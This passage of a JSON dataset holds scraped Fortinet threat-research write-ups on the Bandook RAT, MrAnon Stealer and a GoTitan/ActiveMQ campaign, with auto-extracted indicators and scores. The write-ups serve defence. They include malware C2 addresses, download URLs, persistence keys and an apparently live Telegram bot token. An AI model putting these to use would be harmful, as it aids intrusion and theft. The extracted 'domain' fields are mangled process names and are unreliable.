          "nenote",
          "ordpad",
          "qlservr",
          "ysqld-opt",
          "ynctime",
          "tdetect",
          "ysqld-nt",
          "ydesktopqos",
          "beng50",
          "qlbrowser",
          "fssvccon",
          "nfopath",
          "irefoxconfig",
          "saccess",
          "exsdata",
          "birdconfig",
          "iles",
          "owerpnt",
          "sftesql",
          "qlagent",
          "sqlplussvc",
          "ydesktopservice",
          "hunderbird",
          "cautoupds"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "0867a5d4559cb7084765944e5ab71c67629e90a5fa15e66b7b3d47059c76cb78",
          "872ee36c064f5d9e7df3e5495c7de6aba4b26856556ba2ac124cdbb02693aa02",
          "3cb4c0f6430f5216818c3438a18c96e7dcf5080129c9eea3f50735811c3e85eb",
          "78732997a6c9d975b97da85fc511533d44083a9f9da60dae8393274a59b7bfce",
          "104032d8993555a84679746069ad1f8c1365c4a27eaeec732fda76aa62da005a",
          "eb24adb38f36113fe71f942596c355afd59a2e83a0663daf32ae9bb30059732c",
          "8c46f85644793051b8966d2edeeccdb8416aa04289dc0803d8da90fe6c98014c",
          "790b64a5860a5069fedcb660efdffce2b5ab2195086100a6079697b662f0c198",
          "4fd3f6a16bccb7c9d4631241b6f8ebe58515fa2c593e4c938939492615869432",
          "88f6a6455f92255a189526e36aeb581c95c28dc5e26357e7667f871444a336ba",
          "8879a7a950a3916f5438685f994ee829a20e4c60021db73060cd078e4a72b5a7",
          "d7cb8a2d60e1818d0638a4c38cd6fae475dc83ab7b2bde9827ecc4e4a7ce6ed7",
          "fa7ed15708d988e7f69b5628db9481816052efea29e93f1bd274a1d76006aee6",
          "2673be0eb2cc75805d67cc5876b98cbbe330c73a223be23fb3b41eb447ccd1c9",
          "482754d66d01aa3579f007c2b3c3d0591865eb60ba60b9c28c66fe6f4ac53c52",
          "427ac2bb816309c11b12c895787c862017d5725ed7de137b5eb10c03e89c0b8c",
          "d4cb20dba15d88c38c35be69fe04538b4f9bb0a12edb51ff23c0171b584edf08",
          "45dcbfbb139c81af47b6953482c2d146f5192054c29a2343019e6f1d30912ff4",
          "96a3909ca8917c14a7bd36839dd5abf5c9df9f69b314158e0110365113acf4bb",
          "917f2b461c860f2ee8aed1147094b9273931bb9ee8040d609a485ec150dc3ec0",
          "a1ee84c3183521e345b17502b38621201ff6edb86db81debec25d58dec5ad96c",
          "abc4e3744b5a6b6ca367b81dabc9ff13d509d0bb5b4be6daa7d5419c57e5ea4b",
          "32d1458fb5c0c08156568a658f30143786336a73dea1d76bef9becf4a55c0964",
          "f709d1f84e4f0a845ebb4a9fb1500aa2a9fd600e97cbea32ffc3e49c1084f467",
          "15c9373bc7a1cc990d6caa0f3262f6c4adeff93337f642f752b64947ae50cec9",
          "2a50a42d3c44e6e3890a53228cb84f6fdb17e38b31422c68b8634a06d36cc324",
          "b3725e7f3a53ea398fd0136e63c9c11d8c1addc778eece2ce1ac2ca2fc9cd238",
          "0c0bdd6f7e780b5bde33342e142af12d0d3b2ae40e6d5ab48a4fde3e32751a75",
          "9d163fbffc9692a3143362c51d35d5ab52d1f209d9d5e053196c79a30e6f7acf",
          "91abe280381d0faf55b521f51d16d8aa022f0cc14b1310334d4fffc3474459d4",
          "25d4ec23c3618c7bdbef717c9ded9f7da560b3eb13d8d20f958fe3fbe5a1e37b",
          "281481eb8f1579206e55232754f47587a61bbe1460fc1f3b06157f31d214a290",
          "c83894f6f01a0d4a492c2e05966816e27dac6b9093f83b499b6a5b2f28b53cec",
          "db85c5455b1adee337cf5b6728a9a4776e3645e50d0bf7ff410e34bb710cc42a",
          "f9805be70bc5c750e01a82742a66e6ffa9ade0ba2f80a97cadbb8fcaeb60dda7",
          "aedbddbf7494baaaf759a720d9cd17540d3c171b9cc52a02e0ef9a592bd9cd63",
          "2288a0c896757647538a7dab5e0c980b70b173ed36c9e6206f6701dfd4112cfb",
          "a8d2d0ceaaf6685644b228a767ea6299ea2968f7cae79dd36abf4225b8593fdd",
          "8113218903975b81b22049796f201e06638595d2f6fadd82da06817bfbce85d7",
          "52661e5c4f8503541a5f361cfa8e4518f852907365e23fdfcc8472fea67df12b",
          "274c6ea98df4de5fc99661b0af876c3556c8a9125697efa3cbdc6fa81b80395d",
          "6e591d4815d6e7ec082696f002c843c6d9155e944a99cdd7dab3db372db6a877",
          "2cfd30a7982b90be60f83fe5f4132999ac50d0d63d9681d8d50c3c8271faa34b",
          "c68d9dcd8a3038bfe7c6c008149c8792b6033e6249286e4692e16dcb2bd90d41",
          "45de59851d68929632346d6f894dc8c1b6a5c4197db83c2e33c60631efc0b39f",
          "03666df8dd1cd6f9e05e28a0660223d514351e05a8c61179f59e9e2c5e10d471",
          "bcdf23bb2e1635cb6639895094f7115af7bc9d07f276507af291cd9b7124e135",
          "00e6061a54e469f6c957eda96a0267efded5f8a6a8d4006ea74ded74df5eb703",
          "32b815ce14e6606e53b1ddaf39900c91f126e1d9ce9c5cab2fe825d6b2fa74d9",
          "89c65668def919cdf677df2774c5646540fee498031f7ecd5c7a6be7b62e9953",
          "71bd706cc0ace3774449282a9c1de5403f8f43dad118b9fbf4fc45cf4894f8e9",
          "d0604a3864899ac9bf0a07e47330b62a3e76b61335d6dac2e9b5a796b9fcc164",
          "681f180735ec833997bea4eb26c58f9c2e39980cd0a351e0b5cd99c502b33ae8",
          "c0539fd02ca0184925a932a9e926c681dc9c81b5de4624250f2dd885ca5c4763",
          "4b891c6c3520d1d81e083f72d7ee9c92870ac6633f1f8419b2f50b4f90681ed6",
          "33c861023479ddcaea82f2daee9d0394f304d0c33ba210f4c3c53a93cf9a474c",
          "a31a45f1c686c1ae2ff1733e7e7636a17010b85091b17bdf68c27543866dfca5",
          "f909efbae3c83ae64dcd8f57e18be891df6386ca89f3a2f4c40d12ebc1913ef4",
          "159fa561bf9069418c5b2a33525ee12b16385f96680890a285d401b9f6781643",
          "3a6cfcbf9ef082d94b7a8a0050f42761e115aa3b6ff26edb6c7daf4437fe9917",
          "c447b9a04d36e1a1e8560fc380dec019ec3b63506d07d0116e1ec2c28a9b1c30",
          "4e4c154f0500990e897ca9650eafd3c6255ba4df3b4bc620c6ba27b718278392",
          "454f9058a9fd9c266782389850d6142a0d04ce9d8042bc069ccd8d90d60be6d5",
          "408d62cbf4789d9533230eff49b8b45c11b01fd8c8d6d65ec339725d7521a48c",
          "9f40b69060a52731107baec84a0c0f8a1bfc1a62e8471b9cd69509aade9cb7f1",
          "bab3c87cac6db1700f0a0babaa31f5cd544961d1b9ec03fd8bcdeff837fc9755",
          "f595f91a9966808cc85d11981e66e98043af9aeaaaa3893ef058b9a79c474f17",
          "05c29b528fccf8c2793663a6725c9bf680944ffa6a26129d7aaafd1980bd034c",
          "d26de80e8b561adcf33ab3f2fe29f22c6eaddfbe247dcf9028463214e0f87e90",
          "49699985414185b85cdf0a0292dfd1fb0e7b0b4925daa165351efed6e348335a",
          "667dfdc8b8527599735d93ba94d5e9a30442db7c9e780f103fea07172ee8c740",
          "518544e56e8ccee401ffa1b0a01a10ce23e49ec21ec441c6c7c3951b01c1b19c",
          "9f67b6057e5b5dc4b2ec3b370ca3062e0bed91a934b227911af2a3de17164ee5",
          "8f60d17bbaefd66fe94d34ea3262a1e94b0f8f0702c437d19d3e292c72f1cedc",
          "b3e80316dc1e01af60bcea7218ab5ebfe81432643d29ab46b22e3b11658606d5",
          "3ec359f6ab125099db4a4f7b6ad6b17ab1411a338be932ea45aea13aad7788c8",
          "97a4d094f86b757b3fb0e189f2843a7af8d0ec43f9805214e89992528e83b5d7",
          "356799503f195db260e08a81d42a431b4ebd47cef94eddc96f24a0fd3e49d716",
          "fa620f37539b2c7e53d4c06de1b680d0eab5c3a5280b89d1700e014bfd320519",
          "6cb41c5e8379cc137f64c91f5aaaf88da43b3d13791f12884bedd5a81a83b8d2",
          "30e90f33067608e8e7f4d57fd6903adb5eccb91bf426c56569c16bf86f0d8971",
          "2a270618cf65fcfb6476269b7c7bdbae84552d15a3da3e8907425e20ace4548a",
          "d560b84be808a9a324b995a05686237d645248369ce04069350d5b5d979d8365",
          "fd59543a425d2159dfadba8efd4d40178b609ef123a8bc5cf00fe3afef95623d",
          "54b3641fc695438be989a08a9dca9f2a5d1ed9d538cb83cb597a17480d580c39",
          "e98c033e303e64af465b7d41d779a3780708c97822a6ebb7cf6ff3db64bc3416",
          "505bc570566804139166c0f12ea773d1c459682cc13cfca823b2ddfbd48cd2e2",
          "ea6adefdd2be00d0c7072a9abe188ba9b0c9a75fa57f13a654caeaaf4c3f5fbc",
          "f5d99d4548470b4699b215453e9be29e48aa20616d45f704c335bd3bbe3e0a4f",
          "01b2ec8085dace807c190f3f26d5e5ce45be0c0ecbd9c944303a36f323272226",
          "698b2a9cf9ce16f1cb5cff4576e902888cb14db7414b8e6ac4eb728f8c87d209",
          "9215550ce3b164972413a329ab697012e909d543e8ac05d9901095016dd3fc6c",
          "7e18ff461e3fc159c9b6634c9250600ea4c62da604885697c95d9bac794109b8",
          "3d805293a70df3a5e1e392ee05ed7b88eda054ee97072eac5590baecfc44cb74"
        ],
        "cve": [],
        "email": [
          "removed@rexsdata.pro"
        ],
        "url": []
      },
      "threat_score": 2.368827160493827
    }
  },
  {
    "id": "Fortinet_64684",
    "source": "Fortinet",
    "title": "Bandook - A Persistent Threat That Keeps Evolving",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical Bandook malware is a remote access trojan that has been continuously developed since it was first detected in 2007. It has been used in various campaigns by different threat actors over the years. FortiGuard Labs identified a new Bandook variant being distributed via a PDF file this past October. This PDF file contains a shortened URL that downloads a password-protected .7z file. After the victim extracts the malware with the password in the PDF file, the malware injects its payload into msinfo32.exe. In this article, we will briefly introduce Bandook’s behavior, provide detailed information about the modified elements of this new variant, and share some examples of the mechanism of its C2 communication. The injector component decrypts the payload in the resource table and injects it into msinfo32.exe. Before the injection, a registry key is created to control the behavior of the payload. The key name is the PID of msinfo32.exe, and the value contains the control code for the payload. Once executed with any argument, Bandook creates a registry key containing another control code that enables its payload to establish persistence, and it then injects the payload into a new process of msinfo32.exe. There are two registry keys, shown in Figure 1. A variant reported in 2021 required four control codes and created four processes of explorer.exe that it injected in a single execution. This new variant uses less control code and makes a more precise division of tasks. Figure 2 is the overview of the payload. Once injected, the payload initializes strings for the key names of registries, flags, APIs, etc. After this, it uses the PID of the injected msinfo32.exe to find the registry key and then decodes and parses the key value to perform the task specified by the control code. Figure 3 shows the relationship between the key value and the payload’s behavior. The control codes play the same role as previous variants, but strings are used instead of numbers. The variant we found in October 2023 has two additional control codes, but its injector doesn’t create registries for them. One asks the payload to load fcd.dll, which is downloaded by another injected process and calls fcd.dll’s Init function. The other mechanism establishes persistence and executes Bandook’s copy. These unused control codes have been removed from even newer variants (430b9e91a0936978757eb8c493d06cbd2869f4e332ae00be0b759f2f229ca8ce). Of the two remaining control codes, “ACG” is the main control code for an attack, while “GUM” establishes the persistence mechanism. When the control code is “GUM,” Bandook drops a copy to the SMC folder in the appdata folder as “SMC.exe” or “SMC.cpl” and creates a registry key to automatically execute the copy. There are three registry keys to run SMC.exe. Software\\Microsoft\\Windows\\CurrentVersion\\RunKey name: SMCValue: %APPDATA%\\SMC\\SMC.exe Software\\Microsoft\\Windows NT\\CurrentVersion\\WinlogonKey name: shellValue: explorer.exe, %APPDATA%\\SMC\\SMC.exe Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Key name: LoadValue: short path of %APPDATA%\\SMC\\SMC.exe When the copy is SMC.cpl, the registry key and value are the following: Software\\Microsoft\\Windows\\CurrentVersion\\RunKey name: SMCValue: %windir%\\System32\\controll.exe %APPDATA%\\SMC\\SMC.cpl When the control code is ACG, the payload can download files for other modules, including fcd.dll, pcd.dll, an executable file, and others. This is an optional function based on flags set when the payload initializes. The files can also be downloaded from the C2 server when necessary. If fcd.dll is downloaded, Bandook calls its functions and passes the key names of the registry key as arguments. Similarly, many registry keys store information used in other actions. An action may separated into several parts, and it’s necessary to piece all related commands and registry keys together. For example, C2 communication may use one command to write a registry key and a separate command to read it. First, Bandook sends victim information to its C2 server: If the C2 server is available, Bandook receives commands from the server, including *DJDSR^, @0001, @0002, and so on. While the string sequence in the newest variants reaches @0155, some are only used when sending a result to the server, and others only exist in other modules. As shown in Figure 5, the payload doesn’t use the command @0133, though it can be found in fcd.dll. Despite the numbering, the payload only supports 139 actions. In addition, some special commands are only sent to the server under specific conditions. Since most actions are the same as in previous variants, we will focus on communications between Bandook and the C2 server using the new commands added to the most recent variants. These actions can be roughly categorized as file manipulation, registry manipulation, download, information stealing, file execution, invocation of functions in dlls from the C2, controlling the victim’s computer, process killing, and uninstalling the malware. The data from the C2 server has the following format: {Command}~!{Arg2}~!{Arg3}~!{Arg4}~!{Arg5}~!{Arg6}~! The first argument is the command, which is necessary. Arg2 to Arg6 are optional. Below are four examples of actions that require multiple commands and actions that have complex mechanisms. @0003, @0004 This action is about file reading. If Arg3 is R, it keeps calling the Sleep function until the C2 server sends @0004 and its related arguments to Bandook. The @0004 command gives a value to determine from where to read the file or to just do nothing. Finally, Bandook sends the file specified by Arg2 to the C2 server. @0006, @0007 This action is about file writing. Similar to @0003, @0006 waits for @0007. @0007 determines how to write data from the C2 server to a local file. @0126, @0127, @0128 This action executes a Python file. The main command is @0128, which calls a ShellExecute function to run a Python file {Parent directory}\\Lib\\dpx.pyc with arguments Arg2~Arg6. The {Parent directory} is stored in the registry key pthma under HKCU\\Software. @0126 checks pthma’s value and sends the result to the server. @0127 writes its Arg2 to pthma if fcd.dll is initialized in the victim’s computer. Additionally, some commands send special data to the server: This action monitors the victim’s screen and controls the computer. When Bandook receives this command, it overwrites the config file of Firefox pref.js with code hard-coded in the payload and disables protection mechanisms in Microsoft Edge: Software\\Microsoft\\Internet Explorer TabProcGrowth NoProtectedModeBanner Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3 After this, Bandook creates a virtual desktop and assigns it to a newly created thread (Thread_Control) that establishes a new communication with the C2 server. It first sends the string AVE_MARIA, followed by another packet containing the number 1, to the server. If the server responds, Bandook creates another thread to keep sending screenshots to the server. This thread also sends two packets: the string AVE_MARIA and the number 0. In the meantime, Thread_Control receives coordinates and control codes from the server. These tasks include: In addition, there are three new commands compared to the 2021 variant: This writes encrypted backup URLs to the registry key kPYXM under HKCU\\Software\\AkZhAyV0\\. When the current C2 server is unavailable, Bandook will decrypt it and try to access the URLs. The format of the decrypted data will look like this: {URL}|{URL}|{URL}| Bandook will extract URLs and try these sequentially if the previous URL is unavailable. This command asks Bandook to parse cookies from the browser specified by the C2, including Chrome, Edge, and Firefox, and save the result as Default.json in a .zip file. In the previous variant, @0140 is missing. This command asks Bandook to establish a persistence mechanism with sub_13160400, also called when the control code is GUM, as shown in Figure 9. This article unveils new details about the C2 mechanism of this long-existing malware and the new features in its latest variant. A large number of commands for C2 communication can be found in this malware. However, the tasks performed by its payload are fewer than the number in the command. This is because multiple commands are used for a single action, some commands call functions in other modules, and some are only used to respond to the server. Though the entire system is not observed in this attack, FortiGuard will continue monitoring malware variants and provide appropriate protections. The malware described in this report are detected and blocked by FortiGuard Antivirus as: PDF/Agent.1F56!trW32/Injector. EQDO!trW32/Bandok. NAT!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. 77[.]91[.]100[.]23745[.]67[.]34[.]219 8904ce99827280e447cb19cf226f814b24b0b4eec18dd758e7fb93476b7bf8b8d3e7b5be903eb9a596b9b2b78e5dd28390c6aadb8bdd4ea1ba3d896d99fa00573169171e671315e18949b2ff334db83f81a3962b8389253561c813f01974670be87c338d926cc32c966fce2e968cf6a20c088dc6aedf0467224725ce36c9a5252e7998a8df9491dad978dee76c63cb1493945b9cf198d856a395ba0fae5c265a430b9e91a0936978757eb8c493d06cbd2869f4e332ae00be0b759f2f229ca8cecd78f0f4869d986cf129a6c108264a3517dbcf16ecfc7c88ff3654a6c9be2bca remote access trojan FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/bandook-persistent-threat-that-keeps-evolving",
      "scraped_at": "2025-07-20T13:51:26.719238",
      "indicators": {
        "ip_address": [],
        "domain": [
          "efault",
          "MC",
          "px",
          "ontroll",
          "ref",
          "sinfo32",
          "cd",
          "xplorer"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "430b9e91a0936978757eb8c493d06cbd2869f4e332ae00be0b759f2f229ca8ce"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.2423051735428946
    }
  },
  {
    "id": "Fortinet_21066",
    "source": "Fortinet",
    "title": "MrAnon Stealer Spreads via Email with Fake Hotel Booking PDF",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High FortiGuard Labs recently identified an email phishing campaign using deceptive booking information to entice victims into clicking on a malicious PDF file. The PDF downloads a . NET executable file created with PowerGUI and then runs a PowerShell script to fetch the final malware, known as MrAnon Stealer. This malware is a Python-based information stealer compressed with cx-Freeze to evade detection. MrAnon Stealer steals its victims' credentials, system information, browser sessions, and cryptocurrency extensions. Figure 1 illustrates the attack flow. The downloader URL was mostly queried in Germany, which suggests it was the primary target of the attack. The number of queries for this URL rose significantly in November 2023, implying the campaign was more active and aggressive during that month. In this article, we will detail the behavior of this malware at each stage. The attacker, masquerading as a company looking to reserve hotel rooms, sends phishing emails with the subject, “December Room Availability Query.” The body contains bogus hotel booking details for the holiday season. The attached malicious PDF file has a downloader link hidden in the stream object. Its data after decoding is shown below: Using the strings in the class “Loader,” we identified that the malware used the PowerShell script editor that converts PowerShell scripts to Microsoft executable files. Upon examination of the . NET executable file shown in Figure 6, we found that it utilizes ScriptRunner.dll to extract “Scripts.zip” to obtain a PowerShell script. The extracted file is deposited at the following location: “%USERPROFILE%\\AppData\\Local\\Temp\\Quest Software\\PowerGUI”. This . NET Microsoft Windows executable is solely tasked with unpacking an embedded script named “down2.ps1” and executing it using PowerShell.exe. The packed file and PowerShell configurations are within the resources section of the file, as illustrated in Figure 7. The script initiates the loading of a Windows Form and configures its settings, including form, label, and progress bar. Additionally, it defines text within the execution of the subsequent script to mitigate user suspicions. Within the \"Form Load event\" section, the script retrieves a payload from the identical domain, “anonbin[.]ir,” and decompresses the file in the temporary folder. It then locates the execution file within the zip archive and employs “Start-Process” for execution. A window named “File Not Supported” is displayed in this state, accompanied by a status message indicating “Not Run: python.exe.” This deceptive presentation is designed to mislead users into believing that the malware has not been executed successfully. Figure 10 illustrates the window and progress bar during the execution of the malware. The compressed file “Ads-Pro-V6-Free-Trail (1).zip” includes multiple files. Figure 11 shows the contents of the extracted folder. Within this folder, two DLL files serve as clean components to facilitate the loading of additional Python code by the “python.exe” process. Figure 12 illustrates the WinMain function in “python.exe,” clearly indicating that this is not a legitimate Python executable. Tracing the initial call reveals that the execution file originates from cx_Freeze tools. The script then searches for the directory “\\lib\\library.zip” and uses “PyObject_CallObject” to invoke the malicious Python code. Figure 15 shows the files from “library.zip.” Notably, “cstgversion__main__.pyc” stands out due to its distinct creation time compared to the legitimate files. This particular file encompasses the primary functions responsible for data theft. First, the malware verifies whether the following processes are currently running on the system and terminates them if they exist: “ArmoryQt.exe”, “Atomic Wallet.exe”, “brave.exe”, “bytecoin-gui.exe”, “chrome.exe”, “Coinomi.exe”, “Discord.exe”, “DiscordCanary.exe”, “Element.exe”, “Exodus.exe”, “firefox.exe”, “Guarda.exe”, “KeePassXC.exe”, “NordVPN.exe”, “OpenVPNConnect.exe”, “seamonkey.exe”, “Signal.exe”, “Telegram.exe”, “filezilla.exe”, “filezilla-server-gui.exe”, “keepassxc-proxy.exe”, “msedge.exe”, “nordvpn-service.exe”, “opera.exe”, “steam.exe”, “walletd.exe”, “waterfox.exe”, “yandex.exe” It then uses “ImageGrab” to capture a screenshot, saving it with the filename “Screenshot (Username ).png.” Additionally, it establishes connections with legitimate websites such as “api.ipify.org” and “geolocation-db.com/jsonp” to retrieve the system’s IP address, country name, and country code. It also gathers information from the following sources: Next, it compresses the stolen data, secures it with a password, and designates the filename as “Log (Username).zip.” The compressed file is then uploaded to a public file-sharing website using the URL “hxxps://store1[.]gofile[.]io/uploadFile.” Finally, it appends the download link and system information to a message that is sent to the attacker's Telegram channel using the bot token “6799784870:AAHEU6EUdnAjRcH8Qq0TCokNtVJSL06VmbU.” The support channel for MrAnon Stealer is shown in Figure 18. This support channel promotes its product, provides enhanced capabilities, and includes a purchase page at “hxxp[:]//anoncrypter[.]com” for all associated tools (Figure 19). The malicious actor established the website “anonbin[.]ir” earlier this year, as shown in Figure 20, and downloaded all associated files. Upon investigation, we discovered analogous packed files utilizing cx_Freeze from July. These files consistently feature Python-based stealers, identified by the shared \"HYDRA\" banner within the code, as illustrated in Figure 21. The campaign initially disseminated Cstealer in July and August but transitioned to distributing MrAnon Stealer in October and November. This pattern suggests a strategic approach involving the continued use of phishing emails to propagate a variety of Python-based stealers. In this attack, the threat attacker sends phishing emails with fake room booking details, aiming at specific regions. The malware uses PowerGUI and cx-Freeze tools to create a complex process that involves . NET executable files and PowerShell scripts. The attacker also uses tricks like false error messages to hide successful infection. The malware downloads and extracts files from a specific domain to run a harmful Python script. The script extracts clean DLL files and malware named “python.exe.” These are used to cover up the loading of the malicious payload—MrAnon Stealer. It steals data and sensitive information from several applications and then compresses and uploads the stolen data to a public file-sharing website and the threat actor’s Telegram channel. Users should be careful of phishing emails and unclear PDF files. The malware described in this report are detected and blocked byFortiGuard Antivirusas: PDF/Agent. AZN!tr.dldrMSIL/Agent. FT!trPOWERSHELL/Agent. F6C9!trPython/Stealer. AZN!trW64/Agent.7E0B!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filteringservice. The FortiGuard CDR (content disarm and reconstruction) service can detect and disarm the malicious macros embedded in this email. We also suggest that organizations go through Fortinet’s freeNSE training:Fortinet Certified Fundamentals (FCF). The FCF training helps end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. anonbin[.]iranoncrypter[.]com 075e40be20b4bc5826aa0b031c0ba8355711c66c947bbbaf926b92edb2844cb048e09b8043c0d5dfc2047b573112ead889b112108507d400d2ce3db18987f6c90efba3964f4b760965e94b4d1a597e6cd16241b8c8bf77a664d6216d1420b3128a8c9acf09c84ab5ea4c098eace93888a88b82a1485255073c93ce6080d05ec796ec8ef2338d36b7122a76b0398d97e8d0ed55c85e31649ea00e57d6b1f536288b71525ca378463784ce2d81a8371714580c58f0d305a2aa4630dc964c8c0ee045ee224e571d0fd3a72af1d7a7718e61a1aad03b449cf85377411d51c135bb22 phishing,info stealer malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/mranon-stealer-spreads-via-email-with-fake-hotel-booking-pdf",
      "scraped_at": "2025-07-20T13:51:43.161926",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ibrary",
          "andex",
          "rmoryQt",
          "lement",
          "r",
          "hrome",
          "eePassXC",
          "criptRunner",
          "oinomi",
          "cripts",
          "xodus",
          "iscord",
          "ordVPN",
          "pera",
          "eolocation-db",
          "team",
          "alletd",
          "elegram",
          "iscordCanary",
          "ython",
          "sedge",
          "ordvpn-service",
          "ytecoin-gui",
          "ilezilla-server-gui",
          "irefox",
          "rave",
          "eamonkey",
          "uarda",
          "pi",
          "owerShell",
          "allet",
          "ignal",
          "eepassxc-proxy",
          "aterfox",
          "penVPNConnect",
          "ilezilla"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.9240069084628671
    }
  },
  {
    "id": "Fortinet_82387",
    "source": "Fortinet",
    "title": "GoTitan Botnet - Ongoing Exploitation on Apache ActiveMQ",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Any OS running Apache Active MQ versions prior to 5.15.16, 5.16.7, 5.17.6, and 5.18.3Impacted Parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical This past October, Apache issued a criticaladvisoryaddressing CVE-2023-46604, a vulnerability involving the deserialization of untrusted data in Apache. On November 2, the Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2023-46604 to its known exploited list,KEV Catalog, indicating this vulnerability's high risk and impact. Fortiguard Labs also released anoutbreak alertand athreat signal reportabout the active exploitation of CVE-2023-46604, providing more details and recommendations for mitigation. Technical details and proof-of-concept (PoC) code for CVE-2023-46604 are publicly available, making it easier for attackers to exploit this vulnerability. In recent weeks, Fortiguard Labs has detected numerous threat actors exploiting CVE-2023-46604 to disseminate diverse strains of malware. Our analysis has unveiled the emergence of a newly discovered Golang-based botnet named GoTitan and a . NET program called \"PrCtrl Rat,\" equipped with remote control capabilities. Additionally, we have identified other well-known malware and tools in play. Initially developed as an advanced penetration testing tool and red teaming framework, Sliver supports various callback protocols, including DNS, TCP, and HTTP(S), streamlining egress processes. Kinsing has solidified its position in cryptojacking operations, showcasing its ability to quickly capitalize on newly discovered vulnerabilities. Meanwhile, Ddostf, with a history dating back to 2016, continues to exhibit its proficiency in executing targeted Distributed Denial of Service (DDoS) attacks. This article will detail the exploitation and provide insights into the malware associated with these recent attacks. The attacker initiates a connection to ActiveMQ through the OpenWire protocol, typically on port 61616. By transmitting a crafted packet, the attacker triggers the system to unmarshal a class under their control. This action, in turn, prompts the vulnerable server to retrieve and load a class configuration XML file from a specified remote URL, requiring the presence of a predefined XML file hosted externally. The known exploitation of this vulnerability involves leveraging the “ClassPathXmlApplicationContext” to load a malicious XML application configuration file from a network location via HTTP. Figure 1 shows the captured attacking traffic. The malicious XML file defines the arbitrary code intended to execute on the compromised machine. Attackers can set parameters like “cmd” or “bash” to achieve code execution on the remote vulnerable server (Figure 2). In the following sections, we will explain how the malware works and what it does on infected systems. GoTitan is a new botnet discovered earlier this month. It is written in the Go programming language and is downloaded from a malicious URL, “hxxp://91.92.242.14/main-linux-amd64s”. The attacker only provides binaries for x64 architectures, and the malware performs some checks before running. It also creates a file named \"c.log\" that records the execution time and program status. This file seems to be a debug log for the developer, which suggests that GoTitan is still in an early stage of development. It replicates itself as “/.mod” within the system and establishes a recurring execution by registering in the cron. It then retrieves the C2 IP address and gathers essential information about the compromised endpoint, including architecture, memory, and CPU details. Compiling all the collected data using “<==>” as separators, it transmits its collected information to the C2 server. The C2 message initiates with the hard coded string “Titan<==>”. GoTitan communicates with its C2 server by sending “\\xFE\\xFE” as a heartbeat signal and waiting for further instructions. When it receives a command, it passes it to a function named “handle_socket_func2” that determines an attack method. GoTitan supports ten different methods of launching distributed denial-of-service (DDoS) attacks: UDP, UDP HEX, TCP, TLS, RAW, HTTP GET, HTTP POST, HTTP HEAD, and HTTP PUT. Sliver, an open-source penetration testing tool developed in the Go language and available on GitHub, possesses the potential for misuse when wielded by threat actors due to its diverse features catering to each stage of penetration testing. Threat actors can leverage Sliver to compromise and control multiple targets across various platforms and architectures. The tool enables the generation of customized implants designed to elude detection, allowing for the execution of commands, file uploads and downloads, screenshot capture, and more on infected systems. When communicating with the C2 server at “91[.]92[.]240[.]41” via HTTP requests, Sliver dynamically selects decoders for C2 messages based on parameters in the URI. Additionally, Sliver supports various encoders, including Base32, Base58, Base64, English encoder, Gzip, Hex, and PNG. The encoded C2 communication in HTTP protocol is shown in Figure 8. The attacker retrieves the execution file from “hxxp://199[.]231[.]186[.]249:8000/unifo.dat” and stores it as “svc_veeam.exe”. The file 'unifo.dat' is a . Net framework program initially labeled as “prcli.exe” that was created in August and still spread via CVE-2023-46604. Figure 10 shows the PDB path and detailed information. For persistence, it adds “Security Service” with the current process into the registry “HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.” It then starts the connection to C2 server “173[.]214[.]167[.]155.” Once the command is received from a remote server, it checks for a length of four. If not, it exits the program. It supports five commands: As of this writing, we have yet to receive any messages from the server, and the motive behind disseminating this tool remains unclear. However, once it infiltrates a user's environment, the remote server gains control over the system. Kinsing fetches the bash script from “194[.]38[.]22[.]53/acb.sh.” It serves the following purposes: The batch script used by Ddostf is retrieved from “hxxp://42[.]121[.]111[.]112:81/xml.sh.” It configures the history log with “+o” to prevent the recording of the current session. It then installs curl to download additional execution files and eliminate any traces. The executable file “tomcat” includes the recognizable string 